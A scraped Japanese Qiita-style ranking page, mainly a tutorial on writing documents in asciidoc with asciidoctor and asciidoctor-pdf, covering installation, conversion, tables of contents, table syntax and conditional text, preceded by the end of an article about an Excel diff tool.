<td>Ctrl + B</td>
<td>選択範囲の差分をログとして出力</td>
</tr>
</tbody>
</table>

<h1>
<span id="問題点" class="fragment"></span><a href="#%E5%95%8F%E9%A1%8C%E7%82%B9"><i class="fa fa-link"></i></a>問題点</h1>

<p>列の追加、削除が複数ある場合、列の並び順が想定通りにならないことがあります。<br>
この場合、コンテキストメニューから正しい列ヘッダ(できるだけ一意なヘッダ)を指定して差分を取ると正常に表示されることがあります。</p>

<h1>
<span id="プロジェクト" class="fragment"></span><a href="#%E3%83%97%E3%83%AD%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88"><i class="fa fa-link"></i></a>プロジェクト</h1>

<p>プロジェクトは<a href="https://github.com/skanmera/ExcelMerge" rel="nofollow noopener" target="_blank">GitHub</a> で公開しています</p>

<p>Gridはパフォーマンスを優先するため <a href="https://fastwpfgrid.codeplex.com/" rel="nofollow noopener" target="_blank">FastWpfGrid</a> を使用しています</p>

<h1>
<span id="おわりに" class="fragment"></span><a href="#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB"><i class="fa fa-link"></i></a>おわりに</h1>

<p>今回作成したツールを実際に業務で少し使ってみましたが、<br>
コミット前の差分確認やコンフリクトの解消にかかる時間とストレスを少し軽減できたような気がします。<br>
最終的にはマージする機能を実装することなので、今後も更新していくつもりです。</p>

<p>※この記事で使用したExcelファイルは  <a href="https://hogehoge.tk/personal/generator/" rel="nofollow noopener" target="_blank">こちら</a> のサイトを利用しました 　 </p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">41位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>241</kbd>
		<a target="_blank" href="https://qiita.com/tamikura@github/items/5d3f62dae55617ee42bb">脱Word、脱Markdown、asciidocでドキュメント作成する際のアレコレ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-30<br />04:44:08</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/10862.html">tamikura@github</a>(22件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/10862/profile-images/1509837660">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Markdown]</b> <b>[asciidoctor]</b> <b>[asciidoc]</b> <b>[asciidoctor-pdf]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h2>
<span id="asciidocとは" class="fragment"></span><a href="#asciidoc%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>asciidocとは</h2>

<ul>
<li>asciidocはMarkdownなどのような軽量マークアップ言語の一つで、Webページなどをプレーンテキストで記述することができる(拡張子は.adoc)</li>
</ul>

<h2>
<span id="asciidocを使うようになった経緯" class="fragment"></span><a href="#asciidoc%E3%82%92%E4%BD%BF%E3%81%86%E3%82%88%E3%81%86%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%9F%E7%B5%8C%E7%B7%AF"><i class="fa fa-link"></i></a>asciidocを使うようになった経緯</h2>

<ul>
<li>これまではWordで機能仕様書とか書いていたが、Wordは重い、変更場所が分からない、複数人同時に修正とか面倒で、いい加減Wordを使うのは止めたくなった</li>
<li>なので軽量マークアップ言語にしよう、一番メジャー？なMarkdownにしたら、以下の制約とかでいくらなんでもイマイチ。。

<ul>
<li>表でセルの結合ができない</li>
<li>表のセル内で箇条書きができない</li>
<li>目次が作れない</li>
<li>文字に色がつけられない</li>
<li>上記に対応しようとすると、プラグインやらMarkdown亜種がいろいろ。。</li>
</ul>
</li>
<li>そこで、Markdownより表現方法が豊富なasciidocを使用し、実際に使って、特徴・課題を挙げてみた。</li>
</ul>

<h2>
<span id="asciidoctor-asciidoctor-pdfとは" class="fragment"></span><a href="#asciidoctor-asciidoctor-pdf%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>asciidoctor, asciidoctor-pdfとは</h2>

<ul>
<li>asciidoctor・・・asciidocファイルをHTMLファイルに変換するruby製ツール</li>
<li>asciidoctor-pdf・・・asciidocファイルをPDFファイルに変換するruby製ツール</li>
</ul>

<h2>
<span id="asciidoctorで作成したhtml例" class="fragment"></span><a href="#asciidoctor%E3%81%A7%E4%BD%9C%E6%88%90%E3%81%97%E3%81%9Fhtml%E4%BE%8B"><i class="fa fa-link"></i></a>asciidoctorで作成したHTML例</h2>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">sample.adoc</span></div>
<div class="highlight"><pre><span></span>:lang: ja
:doctype: book
:toc: left
:toclevels: 3
:toc-title: 目次
:sectnums:
:sectnumlevels: 4
:sectlinks:
:imagesdir: ./_images
:icons: font
:source-highlighter: coderay
:example-caption: 例
:table-caption: 表
:figure-caption: 図
:docname: = asciidocの使い方
:author: asciidoc事業部 開発１グループ
:revnumber: 0.1
:revdate: 2017/10/25

= asciidocの使い方

== asciidocとは？

asciidocとは [blue]#軽量マークアップ言語# です

詳しくは&lt;&lt;can_asciidoc,asciidocでできること&gt;&gt;を参照

[[can_asciidoc]]
== asciidocでできること

.コードハイライト
[source, json]
{
  "hoge" : "fuga",
  "foo" : [1,2,3]
}

.結合＋箇条書例
[cols="1,2a,3a"]
|====
|列1|列2|列3
3+|3列結合
.2+|2行縦結合|b-1|c-2
|b-2|
* c-3
* c-4
|====

[NOTE]
====
* format="csv"ではできません
====

=== asciidoctorだとPlantUMLでシーケンス図作成

[plantuml]
----
actor ユーザー as user
user -&gt; ログイン : ログインする
ログイン --&gt; user:
----
</pre></div>
</div>

<p><a href="https://camo.qiitausercontent.com/9ab29fb93ce2048282d90d98b5a41870256914f0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f39656364643234392d623731612d633031312d336234302d6639346462313732653332332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9ab29fb93ce2048282d90d98b5a41870256914f0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f39656364643234392d623731612d633031312d336234302d6639346462313732653332332e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/9ecdd249-b71a-c011-3b40-f94db172e323.png"></a></p>

<h2>
<span id="環境構築windows" class="fragment"></span><a href="#%E7%92%B0%E5%A2%83%E6%A7%8B%E7%AF%89windows"><i class="fa fa-link"></i></a>環境構築(Windows)</h2>

<h3>
<span id="asciidoctor-asciidoctor-pdfのインストール" class="fragment"></span><a href="#asciidoctor-asciidoctor-pdf%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB"><i class="fa fa-link"></i></a>asciidoctor, asciidoctor-pdfのインストール</h3>

<ol>
<li>ruby(2.2以上)をインストール

<ul>
<li><a href="https://rubyinstaller.org/downloads/" class="autolink" rel="nofollow noopener" target="_blank">https://rubyinstaller.org/downloads/</a></li>
</ul>
</li>
<li>コマンドプロンプトで以下を実行</li>
</ol>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>gem install asciidoctor             # asciidoctorのインストール
gem install --pre asciidoctor-pdf   # asciidoctor-pdfのインストール
gem install coderay                 # コードのシンタックスハイライト用
gem install asciidoctor-pdf-cjk     # PDF変換のレイアウト崩れ対応
gem install asciidoctor-diagram     # PlantUMLなどの図を使用
</pre></div></div>

<h3>
<span id="asciidocファイルをhtml-pdf変換" class="fragment"></span><a href="#asciidoc%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92html-pdf%E5%A4%89%E6%8F%9B"><i class="fa fa-link"></i></a>asciidocファイルをHTML, PDF変換</h3>

<ul>
<li>HTMLファイル変換</li>
</ul>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>asciidoctor test.adoc
=&gt; test.htmlが作成される
</pre></div></div>

<ul>
<li>PDFファイル変換</li>
</ul>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>asciidoctor-pdf test.adoc
=&gt; test.pdfが作成される
</pre></div></div>

<ul>
<li>複数ファイルまとめて変換</li>
</ul>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>asciidoctor *.adoc
asciidoctor-pdf *.adoc
</pre></div></div>

<ul>
<li>asciidoctor-pdf-cjk や asciidoctor-diagramを使う場合(-rをつける)</li>
</ul>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>asciidoctor     -r asciidoctor-pdf-cjk -r asciidoctor-diagram test.adoc
asciidoctor-pdf -r asciidoctor-pdf-cjk -r asciidoctor-diagram test.adoc
</pre></div></div>

<h3>
<span id="asciidocファイルをブラウザで表示" class="fragment"></span><a href="#asciidoc%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E3%83%96%E3%83%A9%E3%82%A6%E3%82%B6%E3%81%A7%E8%A1%A8%E7%A4%BA"><i class="fa fa-link"></i></a>asciidocファイルをブラウザで表示</h3>

<p>Firefoxとかchromeでもプラグインを入れることでレンダリング可能</p>

<ul>
<li>Firefox plugin

<ul>
<li><a href="https://addons.mozilla.org/ja/firefox/addon/asciidoctorjs-live-preview/" class="autolink" rel="nofollow noopener" target="_blank">https://addons.mozilla.org/ja/firefox/addon/asciidoctorjs-live-preview/</a></li>
</ul>
</li>
<li>chrome plugin

<ul>
<li><a href="https://chrome.google.com/webstore/detail/asciidoctorjs-live-previe/iaalpfgpbocpdfblpnhhgllgbdbchmia" class="autolink" rel="nofollow noopener" target="_blank">https://chrome.google.com/webstore/detail/asciidoctorjs-live-previe/iaalpfgpbocpdfblpnhhgllgbdbchmia</a></li>
</ul>
</li>
</ul>

<h3>
<span id="asciidocファイルをプレビューできるエディタ" class="fragment"></span><a href="#asciidoc%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E3%83%97%E3%83%AC%E3%83%93%E3%83%A5%E3%83%BC%E3%81%A7%E3%81%8D%E3%82%8B%E3%82%A8%E3%83%87%E3%82%A3%E3%82%BF"><i class="fa fa-link"></i></a>asciidocファイルをプレビューできるエディタ</h3>

<p>以下のエディタを使用すると、リアルタイムでプレビューできるので便利</p>

<ul>
<li>Asciidoc FX

<ul>
<li><a href="http://asciidocfx.com/" class="autolink" rel="nofollow noopener" target="_blank">http://asciidocfx.com/</a></li>
</ul>
</li>
<li>Atom

<ul>
<li><a href="https://atom.io/" class="autolink" rel="nofollow noopener" target="_blank">https://atom.io/</a></li>
<li>インストール後にプラグインを入れることで、プレビュー(<code>Ctrl + Shfit + A</code>)が可能</li>
</ul>
</li>
</ul>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>  apm install language-asciidoc
  apm install asciidoc-preview
</pre></div></div>

<h3>
<span id="worddocxをasciidocファイルに変換する" class="fragment"></span><a href="#worddocx%E3%82%92asciidoc%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AB%E5%A4%89%E6%8F%9B%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>Word(docx)をasciidocファイルに変換する</h3>

<p><code>pandoc</code>というツールを使うと変換できる<br>
そこそこいい感じに変換してくれる</p>

<ol>
<li>pandocインストール

<ul>
<li>リンク先にWindowsのインストーラダウンロードページがある</li>
<li><a href="http://pandoc.org/installing.html" class="autolink" rel="nofollow noopener" target="_blank">http://pandoc.org/installing.html</a></li>
</ul>
</li>
<li>コマンドプロンプトで実行</li>
</ol>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>pandoc --from=docx --to=asciidoc --wrap=none --atx-headers --normalize --extract-media=extracted-media input.docx &gt; output.adoc
</pre></div></div>

<h3>
<span id="plantumlなどの図を表示するための環境構築" class="fragment"></span><a href="#plantuml%E3%81%AA%E3%81%A9%E3%81%AE%E5%9B%B3%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B%E3%81%9F%E3%82%81%E3%81%AE%E7%92%B0%E5%A2%83%E6%A7%8B%E7%AF%89"><i class="fa fa-link"></i></a>PlantUMLなどの図を表示するための環境構築</h3>

<p>PlantUMLなどの図を記述するにはasciidoctor-diagramが必要だが、<br>
それ以外にもJava + Graphvizのインストールが必要（<code>gem install Graphviz</code>ではダメだった）</p>

<ul>
<li>asciidoctor-diagramのインストール</li>
</ul>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>gem install asciidoctor-diagram
</pre></div></div>

<ul>
<li>Javaのインストール</li>
<li>Graphvizのインストール 

<ul>
<li><a href="http://www.graphviz.org/Download_windows.php" class="autolink" rel="nofollow noopener" target="_blank">http://www.graphviz.org/Download_windows.php</a></li>
</ul>
</li>
</ul>

<h2>
<span id="tips" class="fragment"></span><a href="#tips"><i class="fa fa-link"></i></a>TIPS</h2>

<h3>
<span id="文字の色を変える変わらない" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E3%81%AE%E8%89%B2%E3%82%92%E5%A4%89%E3%81%88%E3%82%8B%E5%A4%89%E3%82%8F%E3%82%89%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>文字の色を変える（変わらない）</h3>

<p>色を変える場合、<code>[color]#文字#</code>とかになるが、#が１つの場合は前後にスペースが無いと色が変わらない<br>
スペースが無い場合は<strong>##を2つ入れないといけない</strong></p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">color.adoc</span></div>
<div class="highlight"><pre><span></span>// 前後にスペースがあるので#１つでOK
asciidocとは [blue]#軽量マークアップ言語# です

// 前後にスペースが無いので#１つだと色は変わらない
asciidocとは[blue]#軽量マークアップ言語#です

// 前後にスペースが無い場合、##だとOK
asciidocとは[blue]##軽量マークアップ言語##です

</pre></div>
</div>

<ul>
<li><p>HTML<br>
<a href="https://camo.qiitausercontent.com/94ab89b93cd54344e22adefab882d39215628bc6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f36653934633136622d353566382d313065382d373033302d3263623939663738333835362e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/94ab89b93cd54344e22adefab882d39215628bc6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f36653934633136622d353566382d313065382d373033302d3263623939663738333835362e6a706567" alt="color_html.jpg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/6e94c16b-55f8-10e8-7030-2cb99f783856.jpeg"></a></p></li>
<li><p>PDF<br>
<a href="https://camo.qiitausercontent.com/a4441f5780e0fa740ee8c29d0fb593639b469070/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f35643930313935342d623739392d663465382d643363642d3839323330303261333730632e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a4441f5780e0fa740ee8c29d0fb593639b469070/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f35643930313935342d623739392d663465382d643363642d3839323330303261333730632e6a706567" alt="color_pdf.jpg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/5d901954-b799-f4e8-d3cd-8923002a370c.jpeg"></a></p></li>
<li>
<p>PDFはasciidoctor-pdfのバグなのか変わらない。。。</p>

<ul>
<li><a href="http://gozuk16.hatenablog.com/entry/2016/08/01/180402" class="autolink" rel="nofollow noopener" target="_blank">http://gozuk16.hatenablog.com/entry/2016/08/01/180402</a></li>
</ul>
</li>
</ul>

<h3>
<span id="目次を使う設定する" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%82%92%E4%BD%BF%E3%81%86%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>目次を使う・設定する</h3>

<ul>
<li>
<code>:toc:</code>で目次を使用することが可能(HTML/PDF)

<ul>
<li>
<code>top</code>, <code>left</code>, <code>right</code>等で表示する箇所の指定も可能（個人的には常に表示される<code>left(right)</code>がオススメ）</li>
</ul>
</li>
<li>
<code>:toc: left</code>を付けた結果</li>
</ul>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">toc.adoc</span></div>
<div class="highlight"><pre><span></span>:toc: left

= asciidocの使い方

== asciidocとは？

=== asciidoctorとは？

==== asciidoctorのメリット

==== asciidoctorのデメリット

=== asciidoctor-pdfとは？

== asciidoc記法
</pre></div>
</div>

<p><a href="https://camo.qiitausercontent.com/f5a87cdfe1f977267cbe9ff00e3a7b205037614b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f36363333383939302d613630302d363832372d313966622d3132376636653963646433362e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/f5a87cdfe1f977267cbe9ff00e3a7b205037614b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f36363333383939302d613630302d363832372d313966622d3132376636653963646433362e6a706567" alt="toc_left.jpg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/66338990-a600-6827-19fb-127f6e9cdd36.jpeg"></a></p>

<ul>
<li>
<code>:sectnums:</code>を付けると、セクションが自動的にナンバリングされるのでつけたほうが良い

<ul>
<li>PDF変換だと「Chapter」という文字が勝手に入るので、HTMLとセクション名を合わせる場合は<code>:chapter-label:</code>を入れると消える</li>
</ul>
</li>
<li>目次名はデフォルトで「Table of Contents」なので、<code>:toc-title:</code>で「目次」とか指定したほうが良い</li>
<li>
<code>:sectnums:</code>と<code>:toc-title: 目次</code>を追加した結果</li>
</ul>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">sectnums.adoc</span></div>
<div class="highlight"><pre><span></span>:toc: left
:sectnums:
:toc-title: 目次
:chapter-label:

= asciidocの使い方

== asciidocとは？

=== asciidoctorとは？

==== asciidoctorのメリット

==== asciidoctorのデメリット

=== asciidoctor-pdfとは？

== asciidoc記法
</pre></div>
</div>

<p><a href="https://camo.qiitausercontent.com/ab38419fa1bfc0dcaf9d27f8b2e6c5afd5862c3c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f62326235643035332d383731662d303734622d346466362d3939383164373936386635662e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/ab38419fa1bfc0dcaf9d27f8b2e6c5afd5862c3c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f62326235643035332d383731662d303734622d346466362d3939383164373936386635662e6a706567" alt="toc_sectnum.jpg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/b2b5d053-871f-074b-4df6-9981d7968f5f.jpeg"></a></p>

<ul>
<li>
<code>:toclevels:</code>で表示する階層を指定可能（デフォルト2,最大5）</li>
<li>
<code>:toclevels: 3</code>にした結果</li>
</ul>

<div class="code-frame" data-lang="">
<div class="code-lang"><span class="bold">toclevels.adoc</span></div>
<div class="highlight"><pre><span></span>:toc: left
:sectnums:
:toc-title: 目次
:toclevels: 3

= asciidocの使い方

== asciidocとは？

=== asciidoctorとは？

==== asciidoctorのメリット

==== asciidoctorのデメリット

=== asciidoctor-pdfとは？

== asciidoc記法
</pre></div>
</div>

<p><a href="https://camo.qiitausercontent.com/4f139f36fab1bb96857e1c8bbdb374363c1832a6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f66363966346566642d383235642d303064372d376166632d6537643033353030303062622e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/4f139f36fab1bb96857e1c8bbdb374363c1832a6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f66363966346566642d383235642d303064372d376166632d6537643033353030303062622e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/f69f4efd-825d-00d7-7afc-e7d0350000bb.png"></a></p>

<h3>
<span id="コードをシンタックスハイライトする" class="fragment"></span><a href="#%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E3%82%B7%E3%83%B3%E3%82%BF%E3%83%83%E3%82%AF%E3%82%B9%E3%83%8F%E3%82%A4%E3%83%A9%E3%82%A4%E3%83%88%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>コードをシンタックスハイライトする</h3>

<p>例えば、jsonをシンタックスハイライトしたい場合<br>
単純に<code>[source, json]</code>と記述してもハイライトしてくれない<br>
「coderay」などのライブラリ＆定義が必要</p>

<ul>
<li>coderayのインストール</li>
</ul>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>gem install coderay
</pre></div></div>

<ul>
<li>adocファイルに定義＆記述</li>
</ul>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">source-highlighter.adoc</span></div>
<div class="highlight"><pre><span></span>:source-highlighter: coderay

[source, json]
{
  "hoge" : "fuga",
  "foo" : [1,2,3]
}
</pre></div>
</div>

<ul>
<li>対策後</li>
</ul>

<div class="code-frame" data-lang="json"><div class="highlight"><pre><span></span><span class="p">{</span>
  <span class="nt">"hoge"</span> <span class="p">:</span> <span class="s2">"fuga"</span><span class="p">,</span>
  <span class="nt">"foo"</span> <span class="p">:</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span>
<span class="p">}</span>
</pre></div></div>

<h3>
<span id="自動でセクションにアンカーを付ける" class="fragment"></span><a href="#%E8%87%AA%E5%8B%95%E3%81%A7%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AB%E3%82%A2%E3%83%B3%E3%82%AB%E3%83%BC%E3%82%92%E4%BB%98%E3%81%91%E3%82%8B"><i class="fa fa-link"></i></a>自動でセクションにアンカーを付ける</h3>

<p>目次には自動的にアンカーが付くが、本文には付かないので、<code>:sectlinks:</code>をつけることで自動的にアンカーが付与される。</p>

<h3>
<span id="内部のセクションをリンクする" class="fragment"></span><a href="#%E5%86%85%E9%83%A8%E3%81%AE%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E3%83%AA%E3%83%B3%E3%82%AF%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>内部のセクションをリンクする</h3>

<p><code>[[&lt;アンカー名&gt;]]</code>という形でアンカー名を指定することが可能。<br>
そのアンカーにリンクを貼るには<code>&lt;&lt;&lt;アンカー名&gt;,&lt;リンク名&gt;&gt;&gt;</code>で指定可能</p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">internal_link.adoc</span></div>
<div class="highlight"><pre><span></span>asciidoctorは、asciidocファイルをHTMLファイルに変換するruby製ツールです。

詳しくは&lt;&lt;what_is_asciidoctor,asciidoctorとは？&gt;&gt;を参照

[[what_is_asciidoctor]]
== asciidoctorとは？
</pre></div>
</div>

<p><a href="https://camo.qiitausercontent.com/a29c0ac0c3174331d9204722cd9dcb9da13f4146/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f61616561393236362d333331352d333365632d653163662d6265653761333736643162302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a29c0ac0c3174331d9204722cd9dcb9da13f4146/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f61616561393236362d333331352d333365632d653163662d6265653761333736643162302e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/aaea9266-3315-33ec-e1cf-bee7a376d1b0.png"></a></p>

<h3>
<span id="表のセルを結合する" class="fragment"></span><a href="#%E8%A1%A8%E3%81%AE%E3%82%BB%E3%83%AB%E3%82%92%E7%B5%90%E5%90%88%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>表のセルを結合する</h3>

<p>数値のあとに<code>+</code>を入れると結合になる。数値の前に<code>.</code>があれば縦方向への結合で、なければ横方向の結合となる。</p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">cellspan.adoc</span></div>
<div class="highlight"><pre><span></span>|====
|列1|列2|列3
3+|3列結合
.2+|2行縦結合|b-1|c-2
|b-2|c-2
.2+|2行縦+2列結合の組み合わせ 2+|b-3
|b-4|c-4
|====
</pre></div>
</div>

<p><a href="https://camo.qiitausercontent.com/131a89db7243cfe775a6ed18a9e17a6f191bf051/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f34643530666436362d303434332d393539652d323461352d3631616333373838353365342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/131a89db7243cfe775a6ed18a9e17a6f191bf051/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f34643530666436362d303434332d393539652d323461352d3631616333373838353365342e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/4d50fd66-0443-959e-24a5-61ac378853e4.png"></a></p>

<h3>
<span id="表のセル内で箇条書きにする" class="fragment"></span><a href="#%E8%A1%A8%E3%81%AE%E3%82%BB%E3%83%AB%E5%86%85%E3%81%A7%E7%AE%87%E6%9D%A1%E6%9B%B8%E3%81%8D%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>表のセル内で箇条書きにする</h3>

<p><code>cols</code>に<code>a</code>を付けると、asciidoc形式になるので、箇条書きとかができる。</p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">list.adoc</span></div>
<div class="highlight"><pre><span></span>[cols="1,5a"]
|====
|No|項目
|1|対応ブラウザ

* Firefox
* Chrome
* edge
|2| 対応OS

. Windows
. Linux
. Mac
|====
</pre></div>
</div>

<p><a href="https://camo.qiitausercontent.com/c8becb4f9403c00272cf0259fefe8e6bd52f1351/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f66383933663433312d653265342d633836642d626135632d6635653061623932353434362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/c8becb4f9403c00272cf0259fefe8e6bd52f1351/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31303836322f66383933663433312d653265342d633836642d626135632d6635653061623932353434362e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/10862/f893f431-e2e4-c86d-ba5c-f5e0ab925446.png"></a></p>

<p>補足：<code>format="csv"</code>ではできない模様</p>

<h3>
<span id="条件によって表示非表示にする" class="fragment"></span><a href="#%E6%9D%A1%E4%BB%B6%E3%81%AB%E3%82%88%E3%81%A3%E3%81%A6%E8%A1%A8%E7%A4%BA%E9%9D%9E%E8%A1%A8%E7%A4%BA%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>条件によって表示・非表示にする</h3>

<p><code>ifdef ～ endif</code>を使うことで可能<br>
これにより、チーム用・お客様提出用という感じに分けることが可能</p>

<ul>
<li>表示させない(<code>env-external</code>が無い)

<ul>
<li>
<code>env-external</code>は例で、値は何でもよい</li>
</ul>
</li>
</ul>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">invisible.adoc</span></div>
<div class="highlight"><pre><span></span>ifdef::env-external[]
  この文章はお客様用です
endif::[]
</pre></div>
</div>

<ul>
<li>表示させる(<code>env-external</code>がある)</li>
</ul>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">visible.adoc</span></div>
<div class="highlight"><pre><span></span>:env-external:

ifdef::env-external[]
  この文章はお客様用です
endif::[]
</pre></div>
</div>

<h3>
<span id="コマンドラインで属性を渡す" class="fragment"></span><a href="#%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%83%A9%E3%82%A4%E3%83%B3%E3%81%A7%E5%B1%9E%E6%80%A7%E3%82%92%E6%B8%A1%E3%81%99"><i class="fa fa-link"></i></a>コマンドラインで属性を渡す</h3>

<p>先ほどの<code>env-external</code>ように、adoc内に記述せず、条件によって値を変えたい場合、コマンドラインで属性を渡すことも可能</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>asciidoctor -a env-external test.adoc
</pre></div></div>

<p>属性名だけでなく、値を渡したい場合、<code>属性名=値</code>で指定する<br>
既にadocファイルに同一の属性が記述されている場合、コマンドラインで渡した値が優先される</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>asciidoctor -a toc-title=mokuji test.adoc
</pre></div></div>

<h3>
<span id="脚注のアイコンを出す" class="fragment"></span><a href="#%E8%84%9A%E6%B3%A8%E3%81%AE%E3%82%A2%E3%82%A4%E3%82%B3%E3%83%B3%E3%82%92%E5%87%BA%E3%81%99"><i class="fa fa-link"></i></a>脚注のアイコンを出す</h3>

<p>adocファイル上だとアイコンが出るのに、HTML/PDFだと出ない</p>

<div class="code-frame" data-lang="adoc">
<div class="code-lang"><span class="bold">icon.adoc</span></div>
<div class="highlight"><pre><span></span>[NOTE]
====
* デフォルトでは[NOTE]が出ません
====

[CAUTION]
====
* デフォルトでは[CAUTION]が出ません
====
</pre></div>
</div>

